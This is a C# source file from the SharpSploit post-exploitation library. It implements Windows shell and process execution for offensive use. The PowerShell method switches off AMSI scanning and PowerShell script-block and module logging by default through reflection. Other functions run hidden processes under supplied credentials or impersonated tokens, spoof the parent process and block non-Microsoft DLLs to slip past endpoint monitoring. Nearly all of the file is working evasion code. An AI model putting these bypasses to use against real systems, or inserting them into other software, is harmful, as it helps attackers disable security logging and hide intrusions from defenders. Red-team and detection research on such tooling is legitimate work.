// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Text;
using System.Linq;
using System.IO;
using System.IO.Pipes;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using System.ComponentModel;
using System.Management.Automation;
using System.Runtime.InteropServices;

using PInvoke = SharpSploit.Execution.PlatformInvoke;

namespace SharpSploit.Execution
{
    /// <summary>
    /// Shell is a library for executing shell commands.
    /// </summary>
    public class Shell
    {
        /// <summary>
        /// Executes specified PowerShell code using System.Management.Automation.dll and bypasses
        /// AMSI, ScriptBlock Logging, and Module Logging (but not Transcription Logging).
        /// </summary>
        /// <param name="PowerShellCode">PowerShell code to execute.</param>
        /// <param name="OutString">Switch. If true, appends Out-String to the PowerShellCode to execute.</param>
        /// <param name="BypassLogging">Switch. If true, bypasses ScriptBlock and Module logging.</param>
        /// <param name="BypassAmsi">Switch. If true, bypasses AMSI.</param>
        /// <returns>Output of executed PowerShell.</returns>
        /// <remarks>
        /// Credit for the AMSI bypass goes to Matt Graeber (@mattifestation). Credit for the ScriptBlock/Module
        /// logging bypass goes to Lee Christensen (@_tifkin).
        /// </remarks>
        public static string PowerShellExecute(string PowerShellCode, bool OutString = true, bool BypassLogging = true, bool BypassAmsi = true)
        {
            if (string.IsNullOrEmpty(PowerShellCode)) { return ""; }

            using (PowerShell ps = PowerShell.Create())
            {
                BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
                if (BypassLogging)
                {
                    var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
                    if (PSEtwLogProvider != null)
                    {
                        var EtwProvider = PSEtwLogProvider.GetField("etwProvider", flags);
                        var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                        EtwProvider.SetValue(null, EventProvider);
                    }
                }
                if (BypassAmsi)
                {
                    var amsiUtils = ps.GetType().Assembly.GetType("System.Management.Automation.AmsiUtils");
                    if (amsiUtils != null)
                    {
                        amsiUtils.GetField("amsiInitFailed", flags).SetValue(null, true);
                    }
                }
                ps.AddScript(PowerShellCode);
                if (OutString) { ps.AddCommand("Out-String"); }
                PSDataCollection<object> results = new PSDataCollection<object>();
                ps.Streams.Error.DataAdded += (sender, e) =>
                {
                    Console.WriteLine("Error");
                    foreach (ErrorRecord er in ps.Streams.Error.ReadAll())
                    {
                        results.Add(er);
                    }
                };
                ps.Streams.Verbose.DataAdded += (sender, e) =>
                {
                    foreach (VerboseRecord vr in ps.Streams.Verbose.ReadAll())
                    {
                        results.Add(vr);
                    }
                };
                ps.Streams.Debug.DataAdded += (sender, e) =>
                {
                    foreach (DebugRecord dr in ps.Streams.Debug.ReadAll())
                    {
                        results.Add(dr);
                    }
                };
                ps.Streams.Warning.DataAdded += (sender, e) =>
                {
                    foreach (WarningRecord wr in ps.Streams.Warning)
                    {
                        results.Add(wr);
                    }
                };
                ps.Invoke(null, results);
                string output = string.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                ps.Commands.Clear();
                return output;
            }
        }

        /// <summary>
        /// Creates a specificed process, optionally with an alternative username and password.
        /// Equates to `ExecuteWithPath(ShellCommand, Environment.CurrentDirectory, false)`.
        /// </summary>
        /// <param name="Command">The Command to execute, including any arguments.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Output of the created process.</returns>
        public static string CreateProcess(string Command, string Username = "", string Domain = "", string Password = "")
        {
            return Execute(Command, false, Username, Domain, Password);
        }

        /// <summary>
        /// Creates a specificed process, optionally with an alternative username and password.
        /// Equates to `CreateProcess("cmd.exe /c " + ShellCommand)`.
        /// </summary>
        /// <param name="Command">The Command to execute, including any arguments.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Output of the created process.</returns>
        public static string CreateCmdProcess(string Command, string Username = "", string Domain = "", string Password = "")
        {
            return CreateProcess("cmd.exe /c " + Command, Username, Domain, Password);
        }

        /// <summary>
        /// Executes a specified shell command, optionally with an alternative username and password.
        /// Equates to `ExecuteWithPath(ShellCommand, Environment.CurrentDirectory)`.
        /// </summary>
        /// <param name="ShellCommand">The ShellCommand to execute, including any arguments.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Empty string, no output is captured when UseShellExecute is true.</returns>
        public static string ShellExecute(string ShellCommand, string Username = "", string Domain = "", string Password = "")
        {
            return Execute(ShellCommand, true, Username, Domain, Password);
        }

        /// <summary>
        /// Executes a specified shell command, optionally with an alternative username and password.
        /// Equates to `ShellExecute("cmd.exe /c " + ShellCommand)`.
        /// </summary>
        /// <param name="ShellCommand">The ShellCommand to execute, including any arguments.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Empty string, no output is captured when UseShellExecute is true.</returns>
        public static string ShellCmdExecute(string ShellCommand, string Username = "", string Domain = "", string Password = "")
        {
            return ShellExecute("cmd.exe /c " + ShellCommand, Username, Domain, Password);
        }

        /// <summary>
        /// Executes a specified command, optionally with an alternative username and password.
        /// </summary>
        /// <param name="Command">The ShellCommand to execute, including any arguments.</param>
        /// <param name="UseShellExecute">Switch: true to use ShellExecute, false to use CreateProcess.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Output of the command if UseShellExecute false, empty string if true.</returns>
        public static string Execute(string Command, bool UseShellExecute = false, string Username = "", string Domain = "", string Password = "")
        {
            return Execute(Command, Environment.CurrentDirectory, UseShellExecute, Username, Domain, Password);
        }

        /// <summary>
        /// Executes a specified shell command from a specified directory, optionally with an alternative username and password.
        /// </summary>
        /// <param name="Command">The Command to execute, including any arguments.</param>
        /// <param name="Path">The Path of the directory from which to execute the ShellCommand.</param>
        /// <param name="UseShellExecute">Switch: true to use ShellExecute, false to use CreateProcess.</param>
        /// <param name="Username">Optional alternative username to execute ShellCommand as.</param>
        /// <param name="Domain">Optional alternative Domain of the username to execute ShellCommand as.</param>
        /// <param name="Password">Optional password to authenticate the username to execute the ShellCommand as.</param>
        /// <returns>Output of the command if UseShellExecute false, empty string if true.</returns>
        public static string Execute(string Command, string Path, bool UseShellExecute = false, string Username = "", string Domain = "", string Password = "")
        {
            if (string.IsNullOrEmpty(Command)) { return ""; }

            string ShellCommandName = Command.Split(' ')[0];
            string ShellCommandArguments = "";
            if (Command.Contains(" "))
            {
                ShellCommandArguments = Command.Replace(ShellCommandName + " ", "");
            }

            using (Process process = new Process())
            {
                if (Username != "")
                {
                    process.StartInfo.UserName = Username;
                    process.StartInfo.Domain = Domain;
                    System.Security.SecureString SecurePassword = new System.Security.SecureString();
                    foreach (char c in Password)
                    {
                        SecurePassword.AppendChar(c);
                    }
                    process.StartInfo.Password = SecurePassword;
                }
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WorkingDirectory = Path;
                process.StartInfo.FileName = ShellCommandName;
                process.StartInfo.Arguments = ShellCommandArguments;
                process.StartInfo.UseShellExecute = UseShellExecute;
                if (!process.StartInfo.UseShellExecute)
                {
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    StringBuilder output = new StringBuilder();
                    process.OutputDataReceived += (sender, args) => { output.AppendLine(args.Data); };
                    process.ErrorDataReceived += (sender, args) => { output.AppendLine(args.Data); };
                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();
                    process.WaitForExit();
                    return output.ToString();
                }
                process.Start();
                process.WaitForExit();
                return "";
            }
        }

        /// <summary>
        /// Creates a process with a specified impersonated token. Requires SeAssignPrimaryTokenPrivilege,
        /// typically only available to adminsitrative users.
        /// </summary>
        /// <author>Calvin Hedler (@001SPARTaN)</author>
        /// <param name="Command">The Command to execute, including any arguments.</param>
        /// <param name="hToken">A handle to the impersonated token.</param>
        /// <returns>Output of the created process.</returns>
        public static string CreateProcessWithToken(string Command, IntPtr hToken)
        {
            return CreateProcessWithToken(Command, Environment.CurrentDirectory, hToken);
        }

        /// <summary>
        /// Creates a process with a specified impersonated token. Requires SeAssignPrimaryTokenPrivilege,
        /// typically only available to adminsitrative users.
        /// </summary>
        /// <author>Calvin Hedler (@001SPARTaN)</author>
        /// <param name="Command">The command to execute, including any arguments.</param>
        /// <param name="Path">The path of the directory from which to execute the shell command.</param>
        /// <param name="hToken">A handle to the impersonated token.</param>
        /// <returns>Output of the created process.</returns>
        public static string CreateProcessWithToken(string Command, string Path, IntPtr hToken)
        {
            if (string.IsNullOrEmpty(Command)) { return ""; }

            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
            {
                Win32.ProcessThreadsAPI._PROCESS_INFORMATION ProcInfo;
                using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
                {
                    Win32.ProcessThreadsAPI._STARTUPINFO StartupInfo = new Win32.ProcessThreadsAPI._STARTUPINFO
                    {
                        wShowWindow = 0,
                        hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle(),
                        hStdError = pipeClient.SafePipeHandle.DangerousGetHandle(),
                        dwFlags = (uint)(Win32.ProcessThreadsAPI.STARTF.STARTF_USESTDHANDLES | Win32.ProcessThreadsAPI.STARTF.STARTF_USESHOWWINDOW)
                    };
                    StartupInfo.cb = (uint)Marshal.SizeOf(StartupInfo);
                    
                    if (!PInvoke.Win32.Advapi32.CreateProcessWithTokenW(
                        hToken,                             // hToken
                        Win32.Advapi32.LOGON_FLAGS.NONE,    // dwLogonFlags
                        null,                               // lpApplicationName
                        Command,                            // lpCommandLine
                        Win32.Advapi32.CREATION_FLAGS.NONE, // dwCreationFlags
                        IntPtr.Zero,                        // lpEnvironment
                        Path,                               // lpCurrentDirectory
                        ref StartupInfo,                    // lpStartupInfo
                        out ProcInfo)                       // lpProcessInfo
                    )
                    {
                        return $"Error: {new Win32Exception(Marshal.GetLastWin32Error()).Message}";
                    }
                }
                using (StreamReader reader = new StreamReader(pipeServer))
                {
                    Thread t = new Thread(() =>
                    {
                        PInvoke.Win32.Kernel32.WaitForSingleObject(ProcInfo.hProcess, 0xFFFFFFFF);
                    });
                    t.Start();
                    string output =  reader.ReadToEnd();
                    t.Join();
                    return output;
                }
            }
        }

        /// <summary>
        /// Creates a process specified as argument using the Platform Invoke API.
        /// </summary>
        /// <author>Simone Salucci (@saim1z) & Daniel López (@attl4s)</author>
        /// <param name="targetProcess">The target process to execute.</param>
        /// <returns>PROCESS_INFORMATION structure.</returns>
        /// <remarks>
        /// Code has been kindly stolen and adapted from TikiTorch (https://github.com/rasta-mouse/TikiTorch/blob/064c60c5e23188867a0f9c5a0626dd39718750d4/TikiLoader/Generic.cs).
        /// </remarks>	       
        public static Win32.ProcessThreadsAPI._PROCESS_INFORMATION CreateProcessPInvoke(string targetProcess, bool blockDLL)
        {
            Win32.ProcessThreadsAPI._STARTUPINFOEX StartupInfoEx = new Win32.ProcessThreadsAPI._STARTUPINFOEX();
            Win32.ProcessThreadsAPI._PROCESS_INFORMATION ProcInfo = new Win32.ProcessThreadsAPI._PROCESS_INFORMATION(); 

            StartupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(StartupInfoEx);
            IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);

            Win32.WinBase._SECURITY_ATTRIBUTES pSec = new Win32.WinBase._SECURITY_ATTRIBUTES();
            Win32.WinBase._SECURITY_ATTRIBUTES tSec = new Win32.WinBase._SECURITY_ATTRIBUTES();
            pSec.nLength = (uint)Marshal.SizeOf(pSec);
            tSec.nLength = (uint)Marshal.SizeOf(tSec);

            StartupInfoEx.StartupInfo.dwFlags = (uint)Win32.ProcessThreadsAPI.STARTF.STARTF_USESHOWWINDOW;
            StartupInfoEx.StartupInfo.wShowWindow = 0; //SW_HIDE
            Win32.Advapi32.CREATION_FLAGS flags = Win32.Advapi32.CREATION_FLAGS.CREATE_NO_WINDOW | Win32.Advapi32.CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT;

            if (blockDLL)
            {
                IntPtr lpSize = IntPtr.Zero;
                PInvoke.Win32.Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                StartupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                PInvoke.Win32.Kernel32.InitializeProcThreadAttributeList(StartupInfoEx.lpAttributeList, 1, 0, ref lpSize);
                Marshal.WriteIntPtr(lpValue, new IntPtr((long)Win32.Advapi32.BINARY_SIGNATURE_POLICY.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
                PInvoke.Win32.Kernel32.UpdateProcThreadAttribute(StartupInfoEx.lpAttributeList, 0, (IntPtr)Win32.Advapi32.PROCESS_THREAD_ATTRIBUTE.MITIGATION_POLICY, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
            }

                PInvoke.Win32.Kernel32.CreateProcess(
                    targetProcess,                             
                    null,    
                    ref pSec,                               
                    ref tSec,                          
                    false,                      
                    flags,                     
                    IntPtr.Zero,
                    null,                       
                    ref StartupInfoEx,            
                    out ProcInfo                
                    );                       

            return ProcInfo;
        }

        /// <summary>
        /// Creates a process with the parent process ID specified as argument using the Platform Invoke API.
        /// </summary>
        /// <author>Simone Salucci (@saim1z) & Daniel López (@attl4s)</author>
        /// <param name="targetProcess">The target process to execute.</param>
        /// <param name="parentProcessId">The parent process ID of the new process executed.</param>
        /// <returns>PROCESS_INFORMATION structure.</returns>
        /// <remarks>
        /// Code has been kindly stolen and adapted from TikiTorch (https://github.com/rasta-mouse/TikiTorch/blob/064c60c5e23188867a0f9c5a0626dd39718750d4/TikiLoader/Generic.cs).
        /// </remarks>	 
        public static Win32.ProcessThreadsAPI._PROCESS_INFORMATION CreateProcessPInvokePPID(string targetProcess, int parentProcessId, bool blockDLL)
        {

            Win32.ProcessThreadsAPI._STARTUPINFOEX StartupInfoEx = new Win32.ProcessThreadsAPI._STARTUPINFOEX();
            Win32.ProcessThreadsAPI._PROCESS_INFORMATION ProcInfo = new Win32.ProcessThreadsAPI._PROCESS_INFORMATION();

            StartupInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(StartupInfoEx);         
            IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                Win32.WinBase._SECURITY_ATTRIBUTES pSec = new Win32.WinBase._SECURITY_ATTRIBUTES();
                Win32.WinBase._SECURITY_ATTRIBUTES tSec = new Win32.WinBase._SECURITY_ATTRIBUTES();
                pSec.nLength = (uint)Marshal.SizeOf(pSec);
                tSec.nLength = (uint)Marshal.SizeOf(tSec);

                StartupInfoEx.StartupInfo.dwFlags = (uint)Win32.ProcessThreadsAPI.STARTF.STARTF_USESHOWWINDOW;
                StartupInfoEx.StartupInfo.wShowWindow = 0; //SW_HIDE
                Win32.Advapi32.CREATION_FLAGS flags = Win32.Advapi32.CREATION_FLAGS.CREATE_NO_WINDOW | Win32.Advapi32.CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT;

                IntPtr lpSize = IntPtr.Zero;
                PInvoke.Win32.Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                StartupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                PInvoke.Win32.Kernel32.InitializeProcThreadAttributeList(StartupInfoEx.lpAttributeList, 2, 0, ref lpSize);

                if (blockDLL)
                {
                    Marshal.WriteIntPtr(lpValue, new IntPtr((long)Win32.Advapi32.BINARY_SIGNATURE_POLICY.BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE));
                    PInvoke.Win32.Kernel32.UpdateProcThreadAttribute(StartupInfoEx.lpAttributeList, 0, (IntPtr)Win32.Advapi32.PROCESS_THREAD_ATTRIBUTE.MITIGATION_POLICY, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                }

                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                PInvoke.Win32.Kernel32.UpdateProcThreadAttribute(StartupInfoEx.lpAttributeList, 0, (IntPtr)Win32.Advapi32.PROCESS_THREAD_ATTRIBUTE.PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                PInvoke.Win32.Kernel32.CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref StartupInfoEx, out ProcInfo);

                return ProcInfo;
            }
            finally
            {
                PInvoke.Win32.Kernel32.DeleteProcThreadAttributeList(StartupInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(StartupInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
        }
        
    }
}